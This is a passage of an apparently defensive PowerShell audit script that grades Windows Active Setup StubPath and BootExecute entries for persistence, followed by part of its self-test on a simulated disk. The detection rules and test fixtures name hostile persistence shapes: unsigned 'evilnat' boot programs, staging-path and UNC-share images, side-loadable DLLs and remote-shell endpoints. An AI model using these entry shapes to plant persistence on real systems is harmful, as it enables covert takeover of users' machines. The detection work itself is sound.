        return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath hands a file in a staging path to $(Get-CleanText $to) ${tail}: $s (T1547.014)" }
    }
    if ($r.Shape -eq 'none') { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names no file this check could resolve: $s -- read it by hand (T1547.014)." } }
    if ($r.Shape -eq 'notlocal') {
        if ($null -ne $r.Facts -and $r.Facts.State -eq 'reparse') { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names a program whose path runs through a link or a placeholder ($(Get-CleanText ([string]$r.Facts.Link))) -- not followed and not opened by this audit; what is behind it runs ${tail}: $s (T1547.014)." } }
        return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names a program that is not a plain file on a local fixed drive ($(Get-CleanText ([string]$r.Program))) -- not opened by this audit; it would run from there ${tail}: $s (T1547.014)." }
    }
    if ($r.Shape -eq 'relative') {
        return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names a program by a relative path ($(Get-CleanText ([string]$r.Program))): where that lands depends on the folder Windows starts the command in, which this check cannot know: $s -- read it by hand (T1547.014)." }
    }
    if ($r.Shape -eq 'notfound') {
        $tried = @($r.Tried)
        if ($r.Bare) { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names a program without its folder ($(Get-CleanText (Get-FirstToken $x))), and this account's search path does not hold it: a file by that name on a user's search path would run ${tail}: $s (T1547.014)." } }
        $named = Get-CleanText ([string]$r.Named)
        $stg = @($tried | Where-Object { Test-StagingText $_ })
        if ($stg.Count) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath runs $(Get-CleanText ([string]$stg[0])) from a staging path $tail -- the file is not there yet: $s (T1547.014)" } }
        if ($r.Unsure) { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label names $named, which is not on disk, and the line can also be read as $(Get-CleanText ([string]$r.Unsure)), which is not a plain file on a local fixed drive -- not opened by this audit, so it cannot say that nothing runs: $s (T1547.014)." } }
        if ($r.Truncated) { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label names $named, which is not on disk, and the line has more words than this check reads as a path ($($script:MaxTries)), so it cannot say that nothing runs: $s (T1547.014)." } }
        $outside = @($tried | Where-Object { -not (Test-AdminOnlyPath $_ $SystemRoot) })
        if ($tried.Count -eq 0 -or $outside.Count) {
            $where = $named
            if ($outside.Count) { $where = Get-CleanText ([string]$outside[0]) }
            return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label names $where, which is not on disk, in a folder a standard user may be able to write to: a file placed there later runs $tail -- a left-behind entry, or one waiting for its file: $s (T1547.014)." }
        }
        return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label names $named, which is not on disk -- a stale entry under a folder only an administrator can write: Windows' attempt fails and nothing runs. ($s)" }
    }
    $p = [string]$r.Program
    $pv = Get-CleanText $p
    $f = $r.Facts
    if (Test-StagingText $p) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath runs $pv from a staging path ${tail}: $s (T1547.014)" } }
    if ((Test-PerUserText $p $pu) -or (Test-PerUserText (Get-FirstToken $x) $pu)) {
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath names a program inside each user's own profile ($pv on this account): what runs $tail is whatever each user has there, and this audit sees only its own account's copy: $s (T1547.014)." }
    }
    $leaf = (Get-WinLeaf $p).ToLowerInvariant()
    $lv = Get-CleanText $leaf
    if ($script:ScriptExt -contains ([regex]::Match($leaf, '\.[^.]*$').Value)) { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs a script file ${tail}: $s -- read what it runs (T1547.014)." } }
    $st = [string]$f.State
    if ($st -eq 'unread') { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label names $pv, whose file could not be read ($($f.Why)) -- not graded: $s (T1547.014)." } }
    if ($st -eq 'unverified') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label runs $pv $tail, and its signature could not be verified ($($f.Why)): $s (T1547.014)." } }
    if ($st -ne 'signed') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label runs $pv $tail, and it is not validly signed ($($f.Status)): $s (T1547.014)." } }
    $cls = Get-ProgramClass -Path $p -Facts $f -SystemRoot $SystemRoot
    if ($cls.Renamed) {
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs $pv, which is Microsoft's $(Get-CleanText ([string]$cls.Original)) under another name, ${tail}: $s -- a system program under a borrowed name is how its own name is kept out of sight (T1547.014)." }
    }
    if ($cls.Kind -eq 'scripthost') {
        # `cmd /D /C start <full path>.exe ...` runs that program: grade it
        # as the whole line. Only that shape -- cmd.exe itself in its own
        # folder, a full path with its .exe and nothing in it cmd splits a
        # name on, a file that exists, nothing cmd would expand or chain,
        # and once. Any other `start` is found by cmd's own rules (.COM
        # before .EXE, file associations), not these.
        if ($Depth -eq 0 -and $leaf -eq 'cmd.exe' -and $p -match ('^(?i)' + [regex]::Escape($SystemRoot.TrimEnd('\')) + '\\(?:System32|SysWOW64)\\cmd\.exe$') -and $x -notmatch '[&|<>^%!"()@]') {
            $c = [regex]::Match([string]$r.Rest, '^(?i)[ \t]*(?:/D[ \t]+)?/C[ \t]+start[ \t]+([A-Za-z]:\\[^ \t,;=]*\.exe)((?:[ \t].*)?)$')
            if ($c.Success) {
                $inner = Get-FileFacts $c.Groups[1].Value $Probe $DriveKind
                if (@('signed', 'unsigned', 'unverified', 'unread') -contains [string]$inner.State) {
                    return (Get-StubVerdict -Component $Component -Stub ($c.Groups[1].Value + $c.Groups[2].Value) -IsInstalled $IsInstalled -Kind 'String' -Probe $Probe -DriveKind $DriveKind -Which $Which -SystemRoot $SystemRoot -SystemDrive $SystemDrive -Shown $s -Depth 1)
                }
            }
        }
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs a script host ${tail}: $s -- read what it runs (T1547.014)." }
    }
    if ($cls.Kind -eq 'interpreter') {
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs a script host ($lv, an interpreter) ${tail}: $s -- read what it runs (T1547.014)." }
    }
    if ($cls.Kind -eq 'ms-other') {
        $where = ''
        if (-not (Test-AdminOnlyPath $p $SystemRoot)) { $where = " It sits outside the Windows and Program Files folders of the system drive, where a system file copied to load what lies beside it would be." }
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs $pv, a Microsoft program this check knows no Active Setup use for, ${tail}: $s -- read what it does; its signature says who made the program, not what it is told to do.$where (T1547.014)." }
    }
    if ($cls.Kind -eq 'vendor') {
        # A signed program in a folder a standard user may write to can be
        # replaced, or made to load a file placed beside it (DLL
        # side-loading): the signature covers the program as it is today,
        # not what lies next to it.
        if (-not (Test-AdminOnlyPath $p $SystemRoot)) {
            return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs $pv (signed by $($f.CN)) from a folder a standard user may be able to write to, ${tail}: $s -- anyone who can write there can replace the program or place a file beside it for it to load, so check that this is software you installed (T1547.014)." }
        }
        $v = Get-VendorArgConcern -Rest ([string]$r.Rest) -Probe $Probe -DriveKind $DriveKind -SystemRoot $SystemRoot
        if ($null -ne $v) {
            $vt = Get-CleanText ([string]$v.Text)
            if ($v.Kind -eq 'staged') { return @{ Sev = 'CRITICAL'; File = $p; Line = "[CRITICAL] $label StubPath hands a file in a staging path ($vt) to $lv ${tail}: $s (T1547.014)" } }
            if ($v.Kind -eq 'url') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv an address ($vt) ${tail}: $s -- what comes back from it is not something a signature covers (T1547.014)." } }
            if ($v.Kind -eq 'unc' -or $v.Kind -eq 'notlocal') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a path that is not a plain file on a local fixed drive ($vt) -- not opened by this audit; what is there is used ${tail}: $s (T1547.014)." } }
            if ($v.Kind -eq 'endpoint') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a network endpoint ($vt) ${tail}: $s -- a tunnel or a remote shell needs no file, only somewhere to connect (T1547.014)." } }
            if ($v.Kind -eq 'host') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands the work on to another host ($vt) through $lv ${tail}: $s -- read what it runs (T1547.014)." } }
            if ($v.Kind -eq 'unsigned') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a file that is not validly signed ($vt) ${tail}: $s (T1547.014)." } }
            if ($v.Kind -eq 'prestaged') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a file that is not there ($vt), in a folder a standard user may be able to write to: a file placed there later is used ${tail}: $s (T1547.014)." } }
            if ($v.Kind -eq 'relative') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a code file by a relative name ($vt) that this check cannot place: $s -- read it by hand (T1547.014)." } }
            return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv arguments this check cannot read ($vt): $s -- read it by hand (T1547.014)." }
        }
        # Listed, not cleared: the signature says who made it, and nothing
        # in what it is handed is recognisably code, an address or a host.
        # What the program itself does is not something this check knows.
        return @{ Sev = 'OK'; File = $p; Line = "[INFO] $label runs $pv (signed by $($f.CN)), another vendor's program: this check judged its signature and what it is handed, not what it does <- $s" }
    }
    # A known setup program at its own location: every argument is accounted
    # for, or the line is named.
    $acct = Get-StockArgAccount -Kind ([string]$cls.Kind) -Rest ([string]$r.Rest) -Leaf $leaf
    if (-not $acct.Ok) {
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv something this check cannot account for ($(Get-CleanText ([string]$acct.Why))) ${tail}: $s -- read what it is (T1547.014)." }
    }
    $hostDir = $p.Substring(0, [Math]::Max(0, $p.LastIndexOf('\')))
    $sysRx = '^(?i)' + [regex]::Escape($SystemRoot.TrimEnd('\')) + '\\(?:System32|SysWOW64)\\[^\\]+$'
    $known = [bool]$acct.Known
    $shownTarget = $pv; $shownCN = [string]$f.CN; $first = $true; $stale = ''; $detail = ''
    foreach ($h in @($acct.Files)) {
        $g = Get-HandedFacts -Text ([string]$h.Text) -Dll ([bool]$h.Dll) -HostDir $hostDir -Probe $Probe -DriveKind $DriveKind -Which $Which -SystemRoot $SystemRoot
        $gp = Get-CleanText ([string]$g.RealPath)
        if ($g.State -eq 'relative') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a relative path ($gp) that this check cannot place: $s -- read it by hand (T1547.014)." } }
        if ($g.State -eq 'unplaced') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath names $gp for $lv without its folder, and this account's search path does not hold it: a file by that name placed on the search path would be loaded ${tail}: $s (T1547.014)." } }
        if ($g.State -eq 'notlocal' -or $g.State -eq 'reparse') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a path that is not a plain file on a local fixed drive ($gp) -- not opened by this audit; what is there is used ${tail}: $s (T1547.014)." } }
        if (Test-StagingText ([string]$g.RealPath)) { return @{ Sev = 'CRITICAL'; File = $p; Line = "[CRITICAL] $label StubPath hands a file in a staging path ($gp) to $lv ${tail}: $s (T1547.014)" } }
        if ((Test-PerUserText ([string]$h.Text) $pu) -or (Test-PerUserText ([string]$g.RealPath) $pu)) { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a file inside each user's own profile ($gp on this account): what is used $tail is whatever each user has there, and this audit sees only its own account's copy: $s (T1547.014)." } }
        if ($g.State -eq 'dir') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a folder where a file belongs ($gp): $s -- read it by hand (T1547.014)." } }
        if ($g.State -eq 'absent') {
            if (Test-AdminOnlyPath ([string]$g.RealPath) $SystemRoot) { if (-not $stale) { $stale = $gp }; continue }
            return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a file that is not there ($gp), in a folder a standard user may be able to write to: a file placed there later is used ${tail}: $s (T1547.014)." }
        }
        if ($g.State -eq 'unread') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a file that could not be read (${gp}: $($g.Why)) -- not graded: $s (T1547.014)." } }
        if ($g.State -ne 'signed') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a file that is not validly signed ($gp) ${tail}: $s (T1547.014)." } }
        if (-not (Test-AdminOnlyPath ([string]$g.RealPath) $SystemRoot)) { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv a file (signed by $($g.CN)) in a folder a standard user may be able to write to ($gp) ${tail}: $s -- anyone who can write there can replace it or place a file beside it for it to load, so check that this is software you installed (T1547.014)." } }
        if ($h.Sys -and ([string]$g.RealPath) -notmatch $sysRx) {
            # A known call names a DLL of System32. The same names on a DLL
            # elsewhere are another line; with text after the entry point,
            # one this check cannot account for.
            if ($h.Must) { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $lv something this check cannot account for (text after the entry point of $gp) ${tail}: $s -- read what it is (T1547.014)." } }
            $known = $false
        }
        if ($first) { $first = $false; $detail = ", handing it $gp (signed by $($g.CN))"; if ($h.Dll) { $shownTarget = $gp; $shownCN = [string]$g.CN } }
    }
    if ($stale) { return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label names $stale, which is not on disk -- a stale entry under a folder only an administrator can write: Windows' attempt fails and nothing runs. ($s)" } }
    if ($acct.ByCode) { return @{ Sev = 'OK'; File = $p; Line = "[INFO] $label has $lv repair or install a package by its product code ${tail}: $s -- msiexec.exe is validly signed (by $($f.CN)); the installed package that code names is not traced by this check." } }
    if ($known) { return @{ Sev = 'OK'; File = $p; Line = "[OK] ${label}: $shownTarget (signed by $shownCN) <- $s" } }
    # Validly signed all the way down, and nothing after it that could carry
    # a payload -- but not a line Windows, Edge or Chrome is known to keep.
    return @{ Sev = 'OK'; File = $p; Line = "[INFO] $label runs $pv (signed by $($f.CN))$detail -- validly signed, but not a line this check has on record for Windows, Edge or Chrome: listed, not cleared <- $s" }
}

# PURE. All Installed Components roots. $Roots: @( @{ Root; Required; State =
# ok|nokey|unreadable; Error; Unread = @(names); Entries = @( @{ Key; Name;
# Stub; StubKind; IsInstalled } ) } ).
function Get-ActiveSetupReport {
    param([object[]]$Roots, [scriptblock]$Probe, [scriptblock]$DriveKind, [scriptblock]$Which, [string]$SystemRoot = $env:SystemRoot, [string]$SystemDrive = '')
    $lines = New-Object System.Collections.Generic.List[string]
    $sev = 'OK'; $gap = 'OK'; $n = 0
    $hits = New-Object System.Collections.Generic.List[object]
    foreach ($r in @($Roots)) {
        if ($r.State -eq 'nokey') {
            if ($r.Required) { $lines.Add("[WARNING] Active Setup check NOT performed -- $($r.Root) is not there. Every Windows has it, so the read did not reach the real key; a command run at each user's sign-in would go unseen (T1547.014)."); $gap = 'WARNING' }
            continue
        }
        if ($r.State -eq 'unreadable') {
            $lines.Add("[WARNING] Active Setup check NOT performed -- $($r.Root) could not be read ($($r.Error)), so a command run at each user's sign-in would go unseen (T1547.014).")
            $gap = 'WARNING'; continue
        }
        $u = @($r.Unread | Where-Object { $_ } | ForEach-Object { Get-CleanText ([string]$_) })
        if ($u.Count) {
            $lines.Add(("[WARNING] Active Setup check NOT performed for {0} component(s) under {1} that could not be read: {2} -- a StubPath there cannot be audited, and a restricted key is how one would be hidden (T1547.014)." -f $u.Count, $r.Root, (($u | Select-Object -First 20) -join ', ')))
            $gap = 'WARNING'
        }
        $seen = 0
        foreach ($e in @($r.Entries)) {
            $kind = [string]$e.StubKind
            if (-not $kind) { $kind = 'String' }
            if (@('String', 'ExpandString') -contains $kind -and -not ([string]$e.Stub).Trim(' ', "`t", "`r", "`n")) { continue }
            $seen++
            if ($seen -gt $script:MaxEntries) { continue }
            $n++
            # A component's key and name are chosen by whoever wrote the
            # entry: one line, no control characters, and no apostrophe to
            # end the quoted label early.
            $comp = Get-CleanText ([string]$e.Key)
            if ($e.Name) { $comp = "$comp ($(Get-CleanText ([string]$e.Name)))" }
            $comp = $comp -replace "'", ''
            $x = Get-StubVerdict -Component $comp -Stub ([string]$e.Stub) -IsInstalled ([string]$e.IsInstalled) -Kind $kind -Probe $Probe -DriveKind $DriveKind -Which $Which -SystemRoot $SystemRoot -SystemDrive $SystemDrive
            $lines.Add($x.Line)
            if ($x.Sev -ne 'OK') { $sev = Get-MaxSev $sev $x.Sev; $hits.Add(@{ Key = (Join-WinPath $r.Root ([string]$e.Key)); File = [string]$x.File }) }
        }
        if ($seen -gt $script:MaxEntries) {
            $lines.Add(("[WARNING] Active Setup check NOT performed for {0} StubPath command(s) under {1}: only the first {2} were graded, and no Windows holds that many (T1547.014)." -f ($seen - $script:MaxEntries), $r.Root, $script:MaxEntries))
            $gap = 'WARNING'
        }
    }
    if ($sev -eq 'OK' -and $gap -eq 'OK') { $lines.Add("[OK] Active Setup: $n StubPath command(s) graded, none suspicious.") }
    return @{ Lines = @($lines.ToArray()); Sev = $sev; Gap = $gap; Hits = @($hits.ToArray()) }
}

if ($SelfTest) {
    $fails = 0
    function T { param([string]$N, [bool]$Ok, [string]$Got)
        if ($Ok) { Write-Output "[OK]   $N" } else { Write-Output "[FAIL] $N$(if ($Got) { ": $Got" })"; $script:fails++ }
    }
    # The cases name C:\Windows; %SystemRoot% and %APPDATA% in a StubPath are
    # expanded from the environment, which pwsh on Linux lacks. Restored
    # before leaving.
    $savedSR = $env:SystemRoot; $savedAD = $env:APPDATA
    $env:SystemRoot = 'C:\Windows'
    $env:APPDATA = 'C:\Users\me\AppData\Roaming'
    $SR = 'C:\Windows'
    $guid = '{11111111-2222-3333-4444-555555555555}'

    # THE PRETEND DISK. A file exists only if it is listed here; the probe's
    # answer for anything else is "absent". Every path the graders open, and
    # every name they look up on the search path, is recorded, so the test
    # can show that a network path, a device or a stream never was.
    $script:disk = @{}
    $script:onPath = @{}
    $script:opened = New-Object System.Collections.Generic.List[string]
    $script:asked = New-Object System.Collections.Generic.List[string]
    function Add-File {
        param([string]$Path, [string]$Kind = 'ms', [string]$Real = '', [string]$Orig = '')
        $leaf = (($(if ($Real) { $Real } else { $Path })) -split '\\')[-1]
        $f = @{ State = 'signed'; CN = 'Microsoft Windows'; Microsoft = $true; OriginalName = $leaf; Pe = $true }
        if ($Kind -eq 'mscorp')   { $f = @{ State = 'signed'; CN = 'Microsoft Corporation'; Microsoft = $true; OriginalName = $leaf; Pe = $true } }
        if ($Kind -eq 'vendor')   { $f = @{ State = 'signed'; CN = 'Example Vendor Ltd'; Microsoft = $false; Pe = $true } }
        if ($Kind -eq 'google')   { $f = @{ State = 'signed'; CN = 'Google LLC'; Microsoft = $false; Pe = $true } }
        if ($Kind -eq 'gen')      { $f = @{ State = 'signed'; CN = 'Gen Digital Inc.'; Microsoft = $false; Pe = $true } }
        if ($Kind -eq 'unsigned') { $f = @{ State = 'unsigned'; Status = 'NotSigned'; Pe = $true } }
        if ($Kind -eq 'data')     { $f = @{ State = 'unsigned'; Status = 'UnknownError'; Pe = $false } }
        if ($Kind -eq 'unread')   { $f = @{ State = 'unread'; Why = 'Access to the path is denied.' } }
        if ($Kind -eq 'dir')      { $f = @{ State = 'dir' } }
        if ($Kind -eq 'link')     { $f = @{ State = 'reparse'; Link = $Path } }
        if ($Real) { $f.RealPath = $Real }
        if ($Orig) { $f.OriginalName = $Orig }
        $script:disk[$Path.ToLowerInvariant()] = $f
    }
    $probe = {
        param([string]$p)
        [void]$script:opened.Add($p)
        $f = $script:disk[$p.ToLowerInvariant()]
        if ($f) { return $f }
        return @{ State = 'absent' }
    }
    $dk = { param([string]$l) if ($l -ieq 'C' -or $l -ieq 'D') { 'Fixed' } elseif ($l -ieq 'Z') { 'Network' } elseif ($l -ieq 'E') { 'Removable' } else { 'NoRootDirectory' } }
    # The search path: System32, the Windows folder, then whatever a case put
    # on PATH.
    $which = {
        param([string]$n)
        [void]$script:asked.Add($n)
        foreach ($d in 'C:\Windows\System32', 'C:\Windows') {
            $c = ($d + '\' + $n).ToLowerInvariant()
            if ($script:disk.ContainsKey($c) -and $script:disk[$c].State -ne 'dir') { return ($d + '\' + $n) }
        }
        if ($script:onPath.ContainsKey($n.ToLowerInvariant())) { return [string]$script:onPath[$n.ToLowerInvariant()] }
        return ''
    }
    Add-File 'C:\Windows' 'dir'
    foreach ($n in 'rundll32.exe', 'regsvr32.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe', 'msiexec.exe', 'pcalua.exe',
                   'forfiles.exe', 'conhost.exe', 'notepad.exe', 'ie4uinit.exe', 'unregmp2.exe', 'reg.exe', 'xcopy.exe', 'sdnative.exe',
                   'autofmt.exe', 'poqexec.exe', 'shell32.dll', 'url.dll', 'iesetup.dll', 'mscories.dll', 'themeui.dll', 'advpack.dll',
                   'pcwutl.dll', 'iedkcs32.dll') { Add-File ('C:\Windows\System32\' + $n) }
    foreach ($n in 'rundll32.exe', 'mscories.dll', 'cmd.exe', 'ie4uinit.exe') { Add-File ('C:\Windows\SysWOW64\' + $n) }
    Add-File 'C:\Windows\SysWOW64\unregmp2.exe' 'ms' '' 'pcalua.exe'
    Add-File 'C:\Windows\System32\OpenSSH\ssh.exe'
    Add-File 'C:\Windows\System32\run.cmd' 'data'
    Add-File 'C:\Windows\System32\ie4uinit.com' 'unsigned'
    Add-File 'C:\Windows\Help\unregmp2.exe'
    Add-File 'C:\Program Files\Windows Defender\MpCmdRun.exe' 'mscorp'
    Add-File 'C:\Program Files\Internet Explorer\iexplore.exe' 'mscorp'
    Add-File 'C:\Program Files\OpenSSH\ssh.exe' 'mscorp'
    Add-File 'C:\Program Files\OpenSSH-Vendor\ssh.exe' 'vendor'
    Add-File 'D:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE' 'mscorp'
    Add-File 'C:\Windows\System32\wbem\WMIC.exe'
    Add-File 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    Add-File 'C:\Windows\explorer.exe'
    Add-File 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe'
    Add-File 'C:\Windows\System32\aswBoot.exe' 'gen'
    Add-File 'C:\Windows\System32\agent.exe' 'unsigned'
    Add-File 'C:\Windows\System32\evilnat.exe' 'unsigned'
    Add-File 'C:\Program Files\Windows Mail\WinMail.exe'
    Add-File 'C:\Program Files (x86)\Microsoft\Edge\Application\158.0.4370.33\Installer\setup.exe' 'mscorp'
    Add-File 'C:\Program Files\Google\Chrome\Application\158.0.8127.89\Installer\chrmstp.exe' 'google' '' 'setup.exe'
    Add-File 'C:\Program Files\Google\Chrome\Application\9.9\Installer\chrmstp.exe' 'vendor'
    Add-File 'C:\Program Files\Python312\python.exe' 'vendor'
    Add-File 'C:\Program Files\Vendor\app.exe' 'vendor'
    Add-File 'C:\Program Files\Vendor\locked.exe' 'unread'
    Add-File 'C:\Program Files\A  B\x.exe' 'vendor'
    Add-File 'C:\Program Files\Common Files\Acme\cache.dat' 'unsigned'
    Add-File 'C:\Program Files\Acme\ie4uinit.exe'
    Add-File 'C:\Program Files\Acme\helper.exe' 'ms' '' 'Cmd.Exe'
    Add-File 'C:\Program Files\Acme\evil.dll' 'unsigned'
    Add-File 'C:\Program Files\Acme\tool -x.exe' 'unsigned'
    Add-File 'C:\Program Files\Acme.v2\evil.exe' 'unsigned'
    Add-File 'C:\Program Files\Trail\gone.exe \x.exe' 'unread'
    Add-File 'C:\Program Files\LinkDir\tool.exe' 'link'
    foreach ($n in 'evil.exe', 'evil.dll', 'x.vbs', 'x.bat', 'x.hta', 'x.msi', 'evil.js', 'x.cpl', 'evil.pyw', 'payload.dat') { Add-File ('C:\ProgramData\Acme\' + $n) 'unsigned' }
    Add-File 'C:\ProgramData\Acme\evil.xml' 'data'
    Add-File 'C:\ProgramData\Acme\evil.dat' 'data'
    Add-File 'C:\ProgramData\Acme\ie4uinit.exe'
    Add-File 'C:\ProgramData\Acme\native.exe'
    Add-File 'C:\ProgramData\Vendor\agent.exe' 'unsigned'
    Add-File 'C:\ProgramData\Vendor\cfg.xml' 'data'
    Add-File 'C:\ProgramData\Vendor\signed.msi' 'vendor'
    Add-File 'C:\ProgramData\Vendor\signed.dll' 'vendor'
    Add-File 'C:\ProgramData\Vendor\signedtool.exe' 'vendor'
    Add-File 'C:\Program Files\Vendor\signed.msi' 'vendor'
    Add-File 'C:\Program Files\Vendor\iesetup.dll' 'vendor'
    Add-File 'D:\Tools\Vendor\app.exe' 'vendor'
    Add-File 'C:\Users\Public\tool.exe' 'vendor'
    Add-File 'C:\Users\victim\DOWNLO~1\tool.exe' 'vendor' 'C:\Users\victim\Downloads\tool.exe'
    Add-File 'C:\Users\victim\DOWNLO~1\x.dll' 'vendor' 'C:\Users\victim\Downloads\x.dll'
    Add-File 'C:\Users\victim\DOWNLO~1\data.bin' 'data' 'C:\Users\victim\Downloads\data.bin'
    Add-File 'C:\Users\me\AppData\Roaming\Vendor\app.exe' 'vendor'
    Add-File 'C:\Users\me\AppData\Roaming\Vendor\x.dll' 'vendor'

    function StubCase { param([string]$Stub, [string]$Inst = '1', [string]$Kind = 'String')
        return (Get-StubVerdict -Component 'dz' -Stub $Stub -IsInstalled $Inst -Kind $Kind -Probe $probe -DriveKind $dk -Which $which -SystemRoot $SR -SystemDrive 'C:')
    }
    function BootCase { param([hashtable]$Reads)
        return (Get-BootReport -Reads $Reads -Probe $probe -DriveKind $dk -KeyLabel 'SM' -SystemRoot $SR)
    }
    function BootOne { param([string]$Entry, [string]$Value = 'BootExecute')
        return (BootCase @{ $Value = @{ State = 'present'; Value = @('autocheck autochk *', $Entry); Kind = 'MultiString'; Error = '' } })
    }

    # ---- BootExecute: Windows' own entries (benign twins, verbatim) ----
    # 'autocheck autochk /q /v *' is the CI runner's own value (2026-11-26).
    foreach ($e in @('autocheck autochk *', 'Autocheck Autochk *', 'autocheck autochk /q /v *', 'autocheck autochk /k:C *',
                     'autocheck autochk /k:C /k:D *', 'autocheck autochk /p \??\C:', 'autocheck autochk /m \??\Volume{0b1e2c3d-0000-4000-8000-123456789abc}', 'autochk *', "autocheck`tautochk *")) {
        $v = Get-BootEntryVerdict -Value 'BootExecute' -Entry $e -Image '' -Facts $null -SystemRoot $SR
        T "BootExecute '$(Get-CleanText $e)' is Windows' own disk check: [OK], not raised" ($v.Sev -eq 'OK' -and $v.Line -like '`[OK`]*') $v.Line
    }
    T 'autochk with an argument of another shape is not the stock entry' (-not (Test-AutochkEntry 'autocheck autochk * evil')) ''
    T 'autochk followed by a no-break space is not the stock entry (only a space or a tab separates)' (-not (Test-AutochkEntry ('autocheck autochk' + [char]0xA0 + '/k'))) ''
    T 'the native image is System32\<name>.exe' ((Get-NativeImagePath 'autocheck evilnat /x' -SystemRoot $SR) -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'autocheck evilnat /x' -SystemRoot $SR)
    T 'the async and debug keywords are not the program' ((Get-NativeImagePath 'async evilnat' -SystemRoot $SR) -eq 'C:\Windows\System32\evilnat.exe' -and (Get-NativeImagePath 'debug autocheck evilnat' -SystemRoot $SR) -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'async evilnat' -SystemRoot $SR)
    T 'a \??\ path names the file itself' ((Get-NativeImagePath 'autocheck \??\C:\Users\Public\x.exe' -SystemRoot $SR) -eq 'C:\Users\Public\x.exe') ''
    T 'a \SystemRoot\ native path resolves under the Windows folder' ((Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot $SR) -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot $SR)
    T "'..' is collapsed: a name that climbs out of System32 is not in it" ((Get-NativeImagePath 'autocheck ..\..\ProgramData\Acme\native' -SystemRoot $SR) -eq 'C:\ProgramData\Acme\native.exe') (Get-NativeImagePath 'autocheck ..\..\ProgramData\Acme\native' -SystemRoot $SR)
    T 'another native path is kept as it is, never read as a name in System32' ((Get-NativeImagePath 'autocheck \Device\HarddiskVolume3\x.exe' -SystemRoot $SR) -eq '\Device\HarddiskVolume3\x.exe' -and (Get-NativeImagePath 'autocheck \??\UNC\203.0.113.7\share\boot.exe' -SystemRoot $SR) -eq '\\203.0.113.7\share\boot.exe') (Get-NativeImagePath 'autocheck \??\UNC\203.0.113.7\share\boot.exe' -SystemRoot $SR)

    $b = BootOne 'autocheck evilnat'; $t = $b.Lines -join "`n"
    T 'an unsigned native program added beside autochk is CRITICAL, named with its image' ($b.Sev -eq 'CRITICAL' -and $b.Gap -eq 'OK' -and $t -match "(?m)^\[CRITICAL\] BootExecute entry 'autocheck evilnat' runs .*evilnat\.exe before Windows starts, as SYSTEM, and it is not validly signed") $t
    $b = BootOne 'async evilnat'
    T "hostile boot: 'async evilnat' is graded as evilnat (CRITICAL), the keyword is not the program" ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match 'runs C:\\Windows\\System32\\evilnat\.exe before Windows starts') ($b.Lines -join ' | ')
    $b = BootOne 'autocheck \??\C:\Users\Public\x.exe'
    T 'a native program in C:\Users\Public is CRITICAL from a staging path' ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match 'staging path') ($b.Lines -join ' | ')
    $b = BootOne 'autocheck aswBoot.exe /A:"*" /L:"enu"'
